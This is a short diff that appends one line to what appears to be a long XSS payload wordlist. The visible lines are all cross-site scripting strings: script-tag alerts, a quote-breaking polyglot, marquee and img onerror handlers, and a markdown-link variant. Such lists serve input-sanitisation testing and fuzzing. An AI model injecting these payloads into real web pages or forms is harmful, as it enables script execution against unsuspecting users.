@@ -2847,3 +2847,4 @@ foo<script>alert(2671)</script>
 ';alert(2674))//\';alert(2674))//";alert(2674))//\";alert(2674))//--></SCRIPT>">'><SCRIPT>alert(2674))</SCRIPT>
 <marquee onstart='javascript:alert(2675);'>=(◕_◕)=
 "><img src=x onerror=alert(document.domain)>
+[XSS](.alert(1);)
